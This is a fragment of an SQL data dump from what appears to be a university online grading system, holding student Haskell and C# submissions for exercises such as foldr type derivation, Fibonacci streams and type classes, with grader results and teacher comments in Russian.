(2952, 75, '1384577', '2012-10-31 12:22:49', 0, 'foldr :: (a -> b -> b) -> b -> [a] -> b\r\nfoldr _ z []     = z\r\nfoldr f z (x:xs) = f x (foldr f z xs)\r\n\r\nf :: a -> b -> b\r\nfoldr имеет 3 аргумента и возвращает тип b:\r\nимеем foldr :: (a -> b -> b) -> X -> Y -> b\r\nX - это второй аргумент f, значит, он имеет тип b.\r\nПо (x:xs) понятно, что Y - это список и так как x - первый аргумент f, то Y имеет тип [a]', '<br/>Тесты успешно пройдены!'),
(2953, 75, '1384577', '2012-10-31 13:32:51', 2, 'foldr :: (a -> b -> b) -> b -> [a] -> b\r\nfoldr _ z []     = z\r\nfoldr f z (x:xs) = f x (foldr f z xs)\r\n\r\nf :: a -> b -> b\r\n  --- А почему f имеет тип a -> b -> b  а не скажем a->b->c или a->a->b ? Это тоже надо доказать - допишите, пожалуйста\r\nfoldr имеет 3 аргумента и возвращает тип b:\r\nимеем foldr :: (a -> b -> b) -> X -> Y -> b\r\nX - это второй аргумент f, значит, он имеет тип b.\r\nПо (x:xs) понятно, что Y - это список и так как x - первый аргумент f, то Y имеет тип [a]', '<br/>Тесты успешно пройдены!'),
(2954, 84, 'Deutsche', '2012-10-31 13:48:52', 1, '﻿// Задача 21.2 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _21._2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static IEnumerable<double> Iterate(double start, Func<double, double> f)\r\n\r\n        {\r\n\r\n            for (int i = 1; ; i++)\r\n   --- i кстати особо ни к чему, можно просто for(;;)\r\n            {\r\n\r\n                yield return start;\r\n\r\n                start = f(start);\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Console.WriteLine("Sequence: degrees of 2");\r\n\r\n            foreach (double x in Iterate(2, x => x * 2))\r\n\r\n            {\r\n\r\n                Console.Write(x + ", ");\r\n\r\n                if (x > 1000000)\r\n\r\n                {\r\n\r\n                    Console.Write("...");\r\n\r\n                    break;\r\n\r\n                }\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.WriteLine("Sequence: 1, sin(1), sin(sin(1)), ...");\r\n\r\n            int i = 0;\r\n\r\n            foreach (double x in Iterate(1, Math.Sin))\r\n\r\n            {\r\n\r\n                Console.Write(x + ", ");\r\n\r\n                if (i++ == 100)\r\n\r\n                {\r\n\r\n                    Console.Write("...");\r\n\r\n                    break;\r\n\r\n                }\r\n\r\n            }\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2955, 78, 'erwert', '2012-10-31 13:56:56', 1, 'pascal = [1] :  [ [1] ++ zipWith (+) t (tail t) ++ [1]| t <- pascal]', '<br/>Тесты успешно пройдены!'),
(2956, 81, '374969', '2012-10-31 14:33:58', 1, 'lst239 = 2:3:9:[10*x+y|x<-lst239,y<-[2,3,9]]\r\n', '<br/>Тесты успешно пройдены!'),
(2957, 76, '374969', '2012-10-31 14:48:42', 0, 'data Circle    = Circle    Double\r\ndata Rectangle = Rectangle Double Double\r\n\r\nclass Shape a where\r\n   perimeter :: a -> Double\r\n\r\ninstance Shape Circle where\r\n   perimeter (Circle r) = 2 * pi * r\r\n\r\ninstance Shape Rectangle where\r\n   perimeter (Rectangle x y) = 2*(x + y)\r\n', 'Не удалось вычислить выражение "perimeter (Rect 3 7)", проверьте правильность синтаксиса'),
(2958, 76, '374969', '2012-10-31 14:49:53', 1, 'data Circle = Circle Double\r\ndata Rect   = Rect   Double Double\r\n\r\nclass Shape a where\r\n   perimeter :: a -> Double\r\n\r\ninstance Shape Circle where\r\n   perimeter (Circle r) = 2 * pi * r\r\n\r\ninstance Shape Rect where\r\n   perimeter (Rect x y) = 2*(x + y)', '<br/>Тесты успешно пройдены!'),
(2959, 73, '1029771', '2012-10-31 14:52:57', 1, '\r\nfibs = 1:1:(zipWith (+) (fibs) (tail(fibs)))', '<br/>Тесты успешно пройдены!'),
(2960, 78, '1384577', '2012-10-31 15:18:00', 1, 'pascal = iterate (xs -> zipWith (+) (0:xs) (xs++[0])) [1]', '<br/>Тесты успешно пройдены!'),
(2961, 76, '1384577', '2012-10-31 15:28:28', 1, 'class Shape a where\r\n  perimeter::a -> Double\r\n \r\ndata Circle = Circle Double\r\ndata Rect = Rect Double Double \r\n \r\ninstance Shape Circle where\r\n  perimeter (Circle r) = 2*pi*r\r\n \r\n\r\ninstance Shape Rect where\r\n  perimeter (Rect x y) = 2*(x + y)', '<br/>Тесты успешно пройдены!'),
(2962, 75, '374969', '2012-10-31 15:28:38', 1, 'foldr :: (a -> b -> b) -> b -> [a] -> b\r\n\r\nИспользование:\r\n\r\nfoldr _ d [] = d\r\nfoldr f d (h:t) = f h (foldr f d t)\r\n\r\nПервое и второе условие говорит, что foldr - функция от трех переменных (_ или f - первая, d - вторая, [] или h:t - третья).\r\nfoldr :: A -> B -> C -> D\r\n\r\nПричем сразу вытекает условие на третью переменную - это список. Пусть список будет над типом a.\r\nfoldr :: A -> B -> [a] -> D\r\n\r\nИз первого выражения возьмем еще-то, что вторая переменная имеет тот же тип, что и результат функции foldr.\r\nfoldr :: A -> B -> [a] -> B\r\n\r\nРассмотрим второе условие. Первая переменная - функция от двух переменных и возвращаемым результатом того же типа, что и вторая переменная.\r\nТип первой ее переменная совпадает с типом элементов списка, а тип второй совпадает с типом второй переменной функции foldr.\r\nA :: a -> B -> B\r\n\r\nfoldr :: (a -> B -> B) -> B -> [a] -> B\r\n\r\nНикаких дополнительных условий на тип B и тип a не получаем.\r\nfoldr :: (a -> b -> b) -> b -> [a] -> b', '<br/>Тесты успешно пройдены!'),
(2963, 70, 'sromanov', '2012-10-31 16:43:55', 1, 'myFilter f xs = foldr (e acc -> if f e then e:acc else acc) [] xs', '<br/>Тесты успешно пройдены!'),
(2964, 71, '5656962', '2012-10-31 16:51:54', 0, 'approxSum (x:xs) = if x<0.000001 then 0 else x + approxSum xs\r\n\n\r\n\nz = approxSum ([1/(i^2)| i<-[1..]])\n', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2965, 71, '5656962', '2012-10-31 16:57:12', 1, 'approxSum (x:xs) = if abs(x)<0.000001 then 0 else x + approxSum xs\r\n\r\n\r\n\r\nz = approxSum ([1/(i^2)| i<-[1..]])\r\n', '<br/>Тесты успешно пройдены!'),
(2966, 74, '5656962', '2012-10-31 16:58:13', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\n  --- Нет, это не по условию, к сожалению. В этой задаче имеется в виду другой вариант foldrTree, в котором \r\n  --- у f три аргумента, мы его тоже проходили. Попробуйте его найти и с ним написать, пожалуйста.\r\nfoldTree f e Empty = e\r\n\r\nfoldTree f e (Node x l r) = let lres = foldTree f e l\r\n\r\n				rres = foldTree f e r\r\n\r\n			in x `f` lres `f` rres\r\n\r\n\r\n\r\nsumPos Empty = 0\r\n\r\nsumPos (Node x l r) = foldTree (i res -> if i>=0 then (i + res) else res) 0 (Node x l r)\r\n', '<br/>Тесты успешно пройдены!'),
(2967, 76, '5656962', '2012-10-31 17:08:01', 0, 'data Circle = Circle Double\r\n\ndata Rect = Rect Double Double\r\n\n\r\n\nclass Shape a where\r\n\nperimeter :: a -> Double\r\n\n\r\n\ninstance Shape Circle where\r\n\nperimeter (Circle r) = 2*3.14*r\r\n\ninstance Shape Rect where\r\n\nperimeter (Rect x y) = 2*(x + y) \r\n\n\r\n\n\n', 'Не удалось вычислить выражение "perimeter (Circle 0)", проверьте правильность синтаксиса'),
(2968, 71, 'sromanov', '2012-10-31 17:10:14', 1, 'approxSum xs = sum $ takeWhile (x -> abs x >= 0.000001) xs\r\n\r\nz = approxSum $ map (x -> 1/x^2) [1..]', '<br/>Тесты успешно пройдены!'),
(2969, 70, '532002', '2012-10-31 17:17:57', 1, 'myFilter f xs = foldr(x ys -> if (f x == True) then (x:ys) else ys) [] xs\r\n  --- == True, конечно, можно не писать\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2970, 74, '9539826', '2012-10-31 17:23:22', 1, 'import Data.List\r\ndata Tree = Empty \r\n	| Node Int  Tree Tree \r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) = let lres = foldTree f e l\r\n				rres = foldTree f e r\r\n				in f x lres rres\r\nsumPos = foldTree (x l r -> l+r+((x+(abs x)) `quot` 2))(0)', '<br/>Тесты успешно пройдены!'),
(2971, 71, '532002', '2012-10-31 17:29:35', 0, 'approxSum xs = approxSum1 xs 0 where\r\n\r\napproxSum1 (x:ys) t = if (x<0.000001) then t+x else approxSum1 ys (t+x)\r\n\r\nst = [1/x^2|x<-[1..]]\r\n\r\nz = approxSum st\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2972, 71, '532002', '2012-10-31 17:33:50', 1, 'approxSum xs = approxSum1 xs 0 where\r\n\r\napproxSum1 (x:ys) t = if (abs x<0.000001) then t+x else approxSum1 ys (t+x)\r\n\r\nst = [1/x^2|x<-[1..]]\r\n\r\nz = approxSum st\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2973, 72, '532002', '2012-10-31 17:57:50', 1, 'st = cycle [0,0,0,0,0,1,1]\r\n\r\nweekendExpences xs = foldr ( x s -> fst(x)*snd(x)+s) 0 (zip st xs)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2974, 75, '9539826', '2012-10-31 18:00:29', 1, 'foldr f e (x:xs) = f x (foldr f e xs)\r\nfoldr f e [] = e\r\nпусть f это а1, e - это a2, x:xs - это a3, f x (foldr f e xs) - это a4.\r\na4 = x:xs => x:xs = [a5]\r\nf - применяется к х и (foldr f e xs) => a1 = a5->a4->a4\r\nт.к. е - результат foldr => a2 = a4\r\nв итоге\r\nfoldr :: (a5 -> а4 -> а4) -> а4 -> [a5] -> а4', '<br/>Тесты успешно пройдены!'),
(2975, 82, '63706456', '2012-10-31 18:12:06', 0, 'countDifferentVars _ [] = 0\r\ncountDifferentVars [] (x:xs) = 1 + countDifferentVars [] $ filter (=x) xs \r\ncountDifferentVars ((n,m):xs) ls | (n `elem` ls) || (m `elem` ls) = 1 + recur $ filter (x -> not (x elem [n,m])) ls\r\n				 | otherwise = recur ls\r\n					where recur = countDifferentVars xs', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(2976, 69, '532002', '2012-10-31 18:13:16', 1, 'sins = [sin x|x<-[1..]]\r\n\r\nbigSin x =  sum(take 1 (filter (>x) sins))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2977, 76, '9539826', '2012-10-31 18:16:12', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\nclass Shape a where\r\n	perimeter :: a ->Double\r\ninstance Shape Rect where\r\n	perimeter (Rect x y)=2*x+2*y\r\ninstance Shape Circle where\r\n	perimeter (Circle r)=2*3.14159265*r', '<br/>Тесты успешно пройдены!'),
(2978, 82, '63706456', '2012-10-31 18:18:17', 0, 'countDifferentVars _ [] = 0\r\ncountDifferentVars [] (x:xs) = 1 + countDifferentVars [] $ filter (=x) xs \r\ncountDifferentVars ((n,m):xs) ls | (n `elem` ls) || (m `elem` ls) = 1 + recur $ filter (x -> not (x elem [n,m])) ls\r\n				 | otherwise = recur ls\r\n					where recur = countDifferentVars xs', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(2979, 82, '63706456', '2012-10-31 18:18:34', 0, 'countDifferentVars _ [] = 0\r\ncountDifferentVars [] (x:xs) = 1 + countDifferentVars [] $ filter (/=x) xs \r\ncountDifferentVars ((n,m):xs) ls | (n `elem` ls) || (m `elem` ls) = 1 + recur $ \r\n									filter (x -> not (x `elem` [n,m])) ls\r\n				 | otherwise = recur ls\r\n					where recur = countDifferentVars xs', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(2980, 73, '532002', '2012-10-31 18:26:25', 1, 'fibs = 1 : zipWith (+) fibs (0 : fibs)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2981, 73, 'sromanov', '2012-10-31 18:31:20', 1, 'fibs = 1:1:(zipWith (+) fibs $ tail fibs)', '<br/>Тесты успешно пройдены!'),
(2982, 74, '472848', '2012-10-31 18:44:34', 1, 'data Tree = Empty | Node Int Tree Tree \r\n\r\nfoldTree _ _ Empty = 0\r\nfoldTree f x (Node a left right) = f a (foldTree f x left) (foldTree f x right)\r\n\r\nsumPos tree = foldTree fSumPos 0 tree\r\n\r\nfSumPos x1 x2 x3 = if x1 <= 0 \r\nthen x2 + x3\r\nelse x1 + x2 + x3', '<br/>Тесты успешно пройдены!'),
(2983, 72, '985727', '2012-10-31 18:48:00', 1, 'weekendExpences x = if (length x <6) then 0 \r\nelse if (length x == 6) then (x!!5 ) else ((x!!5) + (x!!6) + weekendExpences (drop 7 x))', '<br/>Тесты успешно пройдены!'),
(2984, 73, '985727', '2012-10-31 18:50:04', 1, 'fibs = 1 : 1 : [a + b | (a,b) <- zip fibs (tail fibs)]', '<br/>Тесты успешно пройдены!'),
(2985, 76, '985727', '2012-10-31 19:22:29', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\nclass Shape a where\r\n	perimeter:: a -> Double\r\ninstance Shape Rect where	\r\n	perimeter (Rect x y ) = 2 * x + 2*y \r\ninstance Shape Circle where\r\n	perimeter ( Circle x ) = 2 * 3.14 * x', '<br/>Тесты успешно пройдены!'),
(2986, 69, '83813', '2012-10-31 19:41:53', 1, 'bigSin x = head $ [r | y <- [1..], let r = sin y, r >= x]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2987, 75, '5656962', '2012-10-31 19:44:54', 1, 'a. foldr :: (a -> b -> b) -> b -> [a] -> b\r\n\r\nб. foldr f e (x:xs) = f x (foldr f e xs)\r\n        a1 a2  a3             a4\r\nfoldr[] = e\r\n\r\n1. ничего не знаем: \r\na1 -> a2 -> a3 -> a4\r\n\r\n2. (x:xs) имеет тип a3, список => a3 = [a5]\r\nf имеет тип a1, функция => a1 = a6 -> a7 -> a8\r\n(a6 -> a7 ->a8) -> a2 -> [a5] -> a4\r\n\r\n3. x - аргумент f, имеет тип a6\r\nx - элемент списка (x:xs), т.е. имеет тип a5 => a6 = a5\r\n\r\nfoldr f e xs - аргумент f, имеет тип a7\r\nfoldr f e xs - результат функции foldr, имеет тип a4 => a4 = a7\r\n\r\nfoldr[] - результат foldr, имеет тип a4. \r\nfoldr[] = e, e имеет тип a2 => a4 = a2\r\n\r\nf x (foldr f e xs) - имеет тип a4. Но результат функции f => имеет тип a8 => a4 = a8\r\n\r\nИтог:\r\n(a5 -> a4 -> a4) -> a4 -> [a5] -> a4', '<br/>Тесты успешно пройдены!'),
(2988, 70, '83813', '2012-10-31 19:45:30', 1, 'myFilter p list = foldr (x acc -> if (p x) then x:acc else acc) [] list\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2989, 76, '5656962', '2012-10-31 19:47:00', 1, 'data Circle = Circle Double\r\n\r\ndata Rect = Rect Double Double\r\n\r\n\r\n\r\nclass Shape a where\r\n\r\n	perimeter :: a -> Double\r\n\r\n\r\n\r\ninstance Shape Circle where\r\n\r\n	perimeter (Circle r) = 2*3.14*r\r\n\r\ninstance Shape Rect where\r\n\r\n	perimeter (Rect x y) = 2*(x + y) \r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2990, 75, 'erwert', '2012-10-31 19:50:44', 2, 'foldr'' :: (a -> b -> b) -> b -> [a] -> b\r\nfoldr'' f a [] = a\r\nfoldr'' f a (h:hs) = f h (foldr f a hs)\r\n\r\nпринимает сначала функцию(предполагаем обазначим за X) затем число и число(типа Y) которые применимы к функции получаем применение функции к числу получаем то же число т.е. тип Y. в конце выход  функция число   и число.\r\n  --- Нет, это должно быть что-то похожее на доказательство. Причем на основе текста функции.\r\n  --- Те там должно быть что-то типа ''поскольку в тексте написано ... и ... значит \r\n  --- мы дожем сделать вывод, что ... <и тут что-то про типы> ...', '<br/>Тесты успешно пройдены!'),
(2991, 71, '83813', '2012-10-31 19:56:33', 0, 'approxSumInt (x:xs) s = if (abs x < 0.000001) then s else approxSumInt xs (s + x)\n\napproxSum xs = approxSumInt xs 0\n\n\n', 'Не удалось вычислить выражение "z>1.64 && z<1.65", проверьте правильность синтаксиса'),
(2992, 75, '44060', '2012-10-31 19:56:41', 1, 'foldr f a [] = a\r\nfoldr f a (x:xs) = f x (foldr f a xs)\r\n\r\n(a -> b -> b) -> b -> [a] -> b\r\n\r\nследовательно\r\n\r\na1 -> a2 -> a3 -> a4. \r\n(a:a2) => a4=a2.\r\n\r\nИзвестно, что a3 - список элементов из a5 (a3 = [a5]).\r\nТогда foldr:: a1 -> a2 -> [a] -> b.\r\n\r\nИз определения функции foldr: (a:a2) => ((foldr f a (x:xs)) : a2) и (x:a) (a:a2) => ((foldr f a xs) : a2) (применяем по почереди к левой и правой части)\r\n\r\nТо есть получили f : (a->a2->a2).\r\nСледовательно a1 = (a->a2->a2).\r\n\r\nПосле этого алгоритм завершается, так как больше ничего сделать нельзя (никаких правил больше не применить).\r\nТеперь, если переименовать a5 =a, получим: \r\n\r\nfoldr:: (a -> a2 -> a2) -> a2 -> [a] -> a2\r\nэто то, что нужно, если переименовать a2 = b', '<br/>Тесты успешно пройдены!'),
(2993, 71, '83813', '2012-10-31 20:04:31', 1, 'approxSumInt (x:xs) s = if (abs x < 0.000001) then s else approxSumInt xs (s + x)\r\n\r\napproxSum xs = approxSumInt xs 0\r\n\r\nz = approxSum [1 / (i * i) | i <- [1..]]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2994, 82, '63706456', '2012-10-31 20:15:43', 2, '   --- Ну вот например вот так у вас выдает неправильные резултатаы\r\n   ---    countDifferentVars [("x","y"),("a","b"),("a","x")] ["b","y"]\r\n   --- Получается 2 (а дб 1)\r\n   --- (В системе в тестах используются не строки, а числа, потому что строки сейчас система понимает\r\n   --- плохо, но в этой программе это не важно ведь)\r\ncountDifferentVars _ [] = 0\r\n\r\ncountDifferentVars [] (x:xs) = 1 + (countDifferentVars [] (filter (/= x) xs))\r\n\r\ncountDifferentVars ((n,m):xs) ls | (n `elem` ls) || (m `elem` ls) = 1 + (recur $ filter (x -> not (x `elem` [n,m])) ls)\r\n				 | otherwise = recur ls\r\n					where recur = countDifferentVars xs', 'Выражение имеет неправильное значение: countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]'),
(2995, 76, 'sromanov', '2012-10-31 20:19:21', 0, 'class Shape a where\r\n    area :: a -> Double\r\n    perim :: a -> Double\r\n\r\ndata Figure = Rect Double Double | Circle Double deriving Show\r\n\r\ninstance Shape Figure where\r\n    area (Rect x y) = x*y\r\n    area (Circle r) = pi*r^2\r\n    perim (Rect x y) = 2*(x+y)\r\n    perim (Circle r) = 2*pi*r\r\n\r\n-- сделать Rect и Circle непсредственно инстансами Shape почему-то не выходит\r\n-- получаю ошибку Not in scope: type constructor or class `Circle'' (`Rect'')', 'Не удалось вычислить выражение "perimeter (Circle 0)", проверьте правильность синтаксиса'),
(2996, 76, 'sromanov', '2012-10-31 20:21:23', 1, 'class Shape a where\r\n    area :: a -> Double\r\n    perimeter :: a -> Double\r\n\r\ndata Figure = Rect Double Double | Circle Double deriving Show\r\n\r\ninstance Shape Figure where\r\n    area (Rect x y) = x*y\r\n    area (Circle r) = pi*r^2\r\n    perimeter (Rect x y) = 2*(x+y)\r\n    perimeter (Circle r) = 2*pi*r\r\n\r\n-- сделать Rect и Circle непсредственно инстансами Shape почему-то не выходит\r\n-- получаю ошибку Not in scope: type constructor or class `Circle'' (`Rect'')\r\n   --- Потому что надо было сделать Rect и Circle отдельными типами (data). f y еразными вариантами одного типа.\r\n   --- class это именно способ определять одну и туже функцию для разных data', '<br/>Тесты успешно пройдены!'),
(2997, 69, '985727', '2012-10-31 20:23:36', 1, 'bigSin x = head(filter (>x) (map (sin) [1..]))', '<br/>Тесты успешно пройдены!'),
(2998, 76, '472848', '2012-10-31 20:25:41', 1, 'class Shape a where \r\n  perimeter  :: a -> Double\r\n\r\ndata Rect = Rect Double Double\r\ndata Circle = Circle Double\r\n\r\ninstance Shape Rect where\r\n  perimeter (Rect x y) = 2 * x + 2 * y\r\n\r\ninstance Shape Circle where\r\n  perimeter (Circle r) = 2 * pi * r', '<br/>Тесты успешно пройдены!'),
(2999, 72, '83813', '2012-10-31 20:27:51', 1, 'weekendExpences xs = snd $\r\n\r\n    foldl\r\n\r\n      (acc x -> ((fst acc + 1) `mod` 7, snd acc + if (fst acc `elem` [5,6]) then x else 0))\r\n\r\n      (0, 0)\r\n\r\n      xs \r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3000, 75, '472848', '2012-10-31 20:41:28', 1, 'тип foldr :: (a -> b -> b) -> b -> [a] -> b\r\n\r\nопределение\r\nfoldr f z [x1, x2, ..., xn] == x1 `f` (x2 `f` ... (xn `f` z)...)\r\n\r\nто есть первый аргумент foldr - это бинарная функция, у которой тип первого аргумента - это тип элемента из списка, который является третьим аргументом у foldr (а). Второй агрумент у функции f - это тип элемента z (b), а результат этой функции - тоже b, потому что он будет использоваться как второй аргумент этой же функции f.\r\n   --- засчитано, но это не совсем то, что требовалось в условии. Надо было доказать какой тип у функции\r\n   --- используя ее _текст_ те ее правила, а не неформальное определение, как у вас.\r\n   --- Другими словами надо было обяснить, как компилятор выводит тип функции - о то знает только правила,\r\n   --- больше ничего. Но ОК, засчитано, а как более правильно, мы разберем', '<br/>Тесты успешно пройдены!'),
(3001, 70, '985727', '2012-10-31 20:53:38', 1, 'myFilter p xs = foldr (x y -> if (p x) then x:y else y) [] xs', '<br/>Тесты успешно пройдены!'),
(3002, 83, '533223', '2012-10-31 21:00:10', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace PrintTable\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<int> Lst239()\r\n        {\r\n            yield return 2;\r\n            yield return 3;\r\n            yield return 9;\r\n            foreach (int i in Lst239())\r\n            {\r\n                yield return 10 * i + 2;\r\n                yield return 10 * i + 3;\r\n                yield return 10 * i + 9;\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            foreach (int x in Lst239())\r\n            {\r\n                Console.WriteLine("{0}", x );\r\n                if (x > 1000)\r\n                    break;\r\n            }\r\n\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3003, 71, '985727', '2012-10-31 21:04:33', 0, 'approxSum xs = foldr (+) 0 (takeWhile (>0.000001) xs)\r\nz = approxSum (map (x-> 1/x^2) [1..])', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(3004, 69, '5477377', '2012-10-31 21:13:49', 1, 'bigSin x = head (filter (y -> y >= x) (map sin [1..]))', '<br/>Тесты успешно пройдены!'),
(3005, 83, '472848', '2012-10-31 21:17:15', 1, 'public static IEnumerable<int> Lst239()\r\n{\r\n  yield return 2;\r\n  yield return 3;\r\n  yield return 9;\r\n  int pow = 10;\r\n  int num = 3;\r\n  int[] val = new int[num];\r\n  int cnt = 0;\r\n  foreach (int i in Lst239())\r\n  {\r\n    val[cnt++] = i;\r\n    if (cnt == num)\r\n    {\r\n      for (int j = 0; j < num; ++j) yield return 2 * pow + val[j];\r\n      for (int j = 0; j < num; ++j) yield return 3 * pow + val[j];\r\n      for (int j = 0; j < num; ++j) yield return 9 * pow + val[j];\r\n      cnt = 0;\r\n      pow *= 10;\r\n      num *= 3;\r\n      val = new int[num];\r\n  --- OK, но на самом деле можно записать гораздо проще, мы это разберем.\r\n    }\r\n  }\r\n}\r\n\r\nstatic void Main(string[] args)\r\n{\r\n  int i = 0;\r\n  foreach (int d in Lst239()) {Console.Write("{0} ", d); if (++i == 100) break; }\r\n}', '<br/>Тесты успешно пройдены!'),
(3006, 71, '985727', '2012-10-31 21:22:02', 1, 'approxSum [] = 0\r\napproxSum xs = if (abs (head xs) > 0.000001) then (head xs + approxSum (tail xs)) else 0\r\nz = approxSum (map (x-> 1/x^2) [1..])', '<br/>Тесты успешно пройдены!'),
(3007, 71, '5477377', '2012-10-31 21:34:18', 1, 'approxSum (x:xs) = \r\n	if abs (x) >= 0.000001 then\r\n		 x + approxSum xs\r\n	else\r\n		0\r\n\r\nz = approxSum (map (x -> 1/(x*x)) [1..])\r\n', '<br/>Тесты успешно пройдены!'),
(3008, 70, '5477377', '2012-10-31 21:54:58', 1, 'myFilter f = foldr (x y -> if f x then x:y else y) []', '<br/>Тесты успешно пройдены!'),
(3009, 72, '5477377', '2012-10-31 22:22:25', 1, 'count x [] = 0\r\ncount (x:xs) (y:ys) = x*y + count xs ys\r\n\r\nweekendExpences x = count (cycle [0,0,0,0,0,1,1]) x', '<br/>Тесты успешно пройдены!'),
(3010, 73, '5477377', '2012-10-31 23:02:37', 1, 'fibs0 = 0:fibs\r\nfibs = 1: zipWith (+) fibs fibs0', '<br/>Тесты успешно пройдены!'),
(3011, 79, 'erwert', '2012-10-31 23:28:43', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<int> digits(int n)\r\n        {\r\n            for (int i = 1; ; i = 10 * i % n)\r\n            {\r\n                yield return 10 * i / n;\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int n = 7, x = 0;\r\n            foreach (int i in digits(n))\r\n            {\r\n                ++x;\r\n                Console.Write(i, i+5);\r\n                Console.Write('' '');\r\n                if (x == 100)\r\n                    break;\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3012, 80, 'erwert', '2012-10-31 23:30:09', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication2\r\n{\r\n    class Couple\r\n    {\r\n        public int One {get; set; }\r\n        public int Two {get; set; }\r\n    }\r\n    \r\n    class Program\r\n    {\r\n        public static IEnumerable<Couple> cantor()\r\n        {\r\n            Couple x;\r\n            for (int i = 1; ; i++)\r\n            {\r\n                for (int j = 1; j < 2*i; j++)\r\n                {\r\n                    x = new Couple();\r\n                    x.One = (i >= j) ? i : j - i;\r\n                    x.Two = (i >= j) ? j : i; \r\n                    yield return x;\r\n                }\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n        }\r\n              ', '<br/>Тесты успешно пройдены!'),
(3013, 75, '318210', '2012-11-01 03:13:02', 1, 'Тип примерно такой\r\n(a -> b -> b) -> b -> [a] -> b\r\n\r\nfoldr _ z []     = z\r\nfoldr f z (x:xs) = f x (foldr f z xs)\r\n\r\n1) Первый аргумент, исходя из второй строки определения - функция двух переменных;\r\n2) Второй аргумент имеет тот же тип, что и ответ. Обозначим этот тип b;\r\n3) Tретий аргумент - это список; Обозначим тип его элементов за a;\r\n4) Из второй строки видно, что f имеет тип a -> b -> b, т.к. её первым аргументом является элемент \r\nсписка (тип его элементов - a), второй аргумент - результат работы ф-ии foldr (из первой строки это b),\r\nну и сам результат имеет тип b. Таким образом получаем (a -> b -> b) -> b -> [a] -> b\r\n', '<br/>Тесты успешно пройдены!'),
(3014, 76, '1029771', '2012-11-01 06:15:26', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double \r\n\r\n\r\nclass Shape a where \r\n	area  :: a -> Double\r\n	perimeter  :: a -> Double \r\n\r\ninstance Shape Rect where \r\n	area (Rect x y) = x * y\r\n	perimeter (Rect x y )= (x+y)*2 \r\n\r\ninstance Shape Circle where \r\n	perimeter (Circle r )= 3.14*2*r\r\n	area (Circle r ) = 3.14*r*r', '<br/>Тесты успешно пройдены!'),
(3015, 74, '442421', '2012-11-01 06:50:44', 0, 'data Tree=Empty|Node Integer Tree Tree deriving Show\r\n\r\nfoldTree (f, g) Empty = f\r\nfoldTree (f, g) (Node x l r) = g x (foldTree (f, g) l) (foldTree (f, g) r)\r\n\r\nsumPos = (0, x l r -> div (x + abs x) 2 + l + r)', 'Не удалось вычислить выражение "sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))", проверьте правильность синтаксиса'),
(3016, 74, '442421', '2012-11-01 06:52:33', 1, 'data Tree=Empty|Node Integer Tree Tree deriving Show\r\n\r\nfoldTree (f, g) Empty = f\r\nfoldTree (f, g) (Node x l r) = g x (foldTree (f, g) l) (foldTree (f, g) r)\r\n\r\nsumPos x = foldTree sumPosAlg x\r\n\r\nsumPosAlg = (0, x l r -> div (x + abs x) 2 + l + r)', '<br/>Тесты успешно пройдены!'),
(3017, 70, '442421', '2012-11-01 07:08:11', 1, 'myFilter :: (a -> Bool) -> [a] -> [a]\r\nmyFilter b = foldr (x xs -> if b x then x : xs else xs) []', '<br/>Тесты успешно пройдены!'),
